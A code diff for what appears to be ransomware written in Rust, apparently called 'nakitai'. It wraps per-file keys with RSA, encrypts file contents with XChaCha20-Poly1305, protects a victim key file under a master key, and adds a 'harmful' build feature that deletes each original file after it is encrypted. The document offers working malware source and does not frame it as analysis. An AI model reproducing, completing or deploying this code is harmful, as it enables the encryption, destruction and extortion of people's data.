@@ -13,9 +13,15 @@ use openssl::{
     rsa::{Padding, Rsa},
     symm::{decrypt, encrypt, Cipher},
 };
-use std::io::{Read};
-use std::{fs::File, io::Write};
+use std::io::Read;
+use std::{
+    fs::{remove_file, File},
+    io::Write,
+    path::Path,
+};
 
+// This is gonna be done with the `extract_decryption_key_nky.js`
+#[cfg(debug_assertions)]
 pub fn decrypt_private_key(
     og_public_key_size: usize,
     og_private_key: &Rsa<Private>,
@@ -25,10 +31,7 @@ pub fn decrypt_private_key(
     let iv = &encrypted_nakitai_key[og_public_key_size..og_public_key_size + 16];
     let ciphertext = &encrypted_nakitai_key[og_public_key_size + 16..];
 
-    println!("");
-    println!("<===== decrypt_private_key =====>");
-    println!("");
-
+    println!("\n<===== decrypt_private_key =====>\n");
     println!("key_ciphertext => {:?}", key_ciphertext);
 
     let mut key: Vec<u8> = vec![0u8; og_private_key.size() as usize];
@@ -63,27 +66,17 @@ pub fn encrypt_private_key(
     #[cfg(debug_assertions)]
     {
         println!("==== nky key generation ====");
-        println!("key => {:?}", key);
-        println!("iv => {:?}", iv);
-        println!("safeword => {:?}", safeword);
-        println!("private_key_pem => {:?}", private_key_pem);
+        println!("key [({:?})] => {:?}", key.len(), key);
+        println!("iv [({:?})] => {:?}", iv.len(), iv);
+        println!("safeword [({:?})] => {:?}", safeword.len(), safeword);
+        println!(
+            "private_key_pem [({:?})] => {:?}",
+            private_key_pem.len(),
+            private_key_pem
+        );
     }
 
     og_public_key.public_encrypt(&key, &mut key_ciphertext, Padding::PKCS1_OAEP)?;
-
-    /*{
-        println!("");
-        println!("<===== decrypt_private_key =====>");
-        println!("");
-
-        let og_private_key_b = include_bytes!("../../og_private.pem");
-        let og_private_key = Rsa::private_key_from_pem(&og_private_key_b.as_slice())?;
-        let mut key: Vec<u8> = vec![0u8; og_private_key.size() as usize];
-
-        og_private_key.private_decrypt(&key_ciphertext, &mut key, Padding::PKCS1_OAEP)?;
-
-        println!("key => {:?}", key);
-    }*/
 
     let private_key_ciphertext = encrypt(
         Cipher::aes_256_cbc(),
@@ -103,9 +96,17 @@ pub fn encrypt_private_key(
     #[cfg(debug_assertions)]
     {
         println!("==== nky key encryption ====");
-        println!("key_ciphertext => {:?}", key_ciphertext);
-        println!("iv => {:?}", iv);
-        println!("private_key_ciphertext => {:?}", private_key_ciphertext);
+        println!(
+            "key_ciphertext [({:?})] => {:?}",
+            key_ciphertext.len(),
+            key_ciphertext
+        );
+        println!("iv [({:?})] => {:?}", iv.len(), iv);
+        println!(
+            "private_key_ciphertext [({:?})] => {:?}",
+            private_key_ciphertext.len(),
+            private_key_ciphertext
+        );
     }
 
     let key_ciphertext_encoded = encode(&c);
@@ -144,6 +145,12 @@ pub fn encrypt_file(file_path: &str, public_key: &Rsa<Public>) -> Result<String,
 
     public_key.public_encrypt(&key, &mut key_ciphertext, Padding::PKCS1_OAEP)?;
 
+    /*println!(
+        "key_ciphertext [({:?})] => {:?}",
+        key_ciphertext.len(),
+        key_ciphertext
+    );*/
+
     let aead = XChaCha20Poly1305::new(key.as_ref().into());
 
     let mut stream_encryptor = EncryptorBE32::from_aead(aead, nonce.as_ref().into());
@@ -169,6 +176,23 @@ pub fn encrypt_file(file_path: &str, public_key: &Rsa<Public>) -> Result<String,
         }
     }
 
+    #[cfg(not(feature = "harmful"))]
+    {
+        #[cfg(debug_assertions)]
+        {
+            println!("Encrypted => {:?}", file_path);
+        }
+    }
+
+    #[cfg(feature = "harmful")]
+    {
+        #[cfg(debug_assertions)]
+        {
+            println!("Encrypted & Del => {:?}", file_path);
+        }
+        remove_file(file_path)?;
+    }
+
     Ok(dest_file_name)
 }
 
@@ -179,16 +203,25 @@ pub fn decrypt_file(
 ) -> Result<(), anyhow::Error> {
     let mut source_file = File::open(file_path)?;
 
+    let dest_file_name = Path::new(file_path).with_extension("").into_os_string();
+    let mut dest_file = File::create(&dest_file_name)?;
+
     let mut key: Vec<u8> = vec![0u8; private_key.size() as usize];
-    let mut encrypted_key = vec![0u8; public_key_len];
+    let mut key_ciphertext = vec![0u8; public_key_len];
     let mut nonce = [0u8; 19];
     let mut safeword = [0u8; 3];
 
-    let _ = source_file.read(&mut encrypted_key)?;
+    let _ = source_file.read(&mut key_ciphertext)?;
     let _ = source_file.read(&mut nonce)?;
     let _ = source_file.read(&mut safeword)?;
 
-    private_key.private_decrypt(&encrypted_key, &mut key, Padding::PKCS1_OAEP)?;
+    /*println!(
+        "key_ciphertext [({:?})] => {:?}",
+        key_ciphertext.len(),
+        key_ciphertext
+    );*/
+
+    private_key.private_decrypt(&key_ciphertext, &mut key, Padding::PKCS1_OAEP)?;
 
     key.resize(32, 0u8);
 
@@ -210,17 +243,24 @@ pub fn decrypt_file(
         if read_count == BUFFER_LEN {
             let plaintext = stream_decryptor
                 .decrypt_next(&buffer[..])
-                .map_err(|err| anyhow!("Decrypting large file: {}", err))?;
-            println!("plaintext: {:?}", String::from_utf8(plaintext)?);
+                .map_err(|err| anyhow!("Error decrypting large file: {}", err))?;
+            dest_file.write(&plaintext)?;
         } else if read_count == 0 {
             break;
         } else {
             let plaintext = stream_decryptor
                 .decrypt_last(&buffer[..read_count])
-                .map_err(|err| anyhow!("Decrypting large file: {}", err))?;
-            println!("plaintext: {:?}", String::from_utf8(plaintext)?);
+                .map_err(|err| anyhow!("Error decrypting large file: {}", err))?;
+            dest_file.write(&plaintext)?;
             break;
         }
+    }
+
+    remove_file(&file_path)?;
+
+    #[cfg(debug_assertions)]
+    {
+        println!("Decrypted => {:?}", file_path);
     }
 
     Ok(())
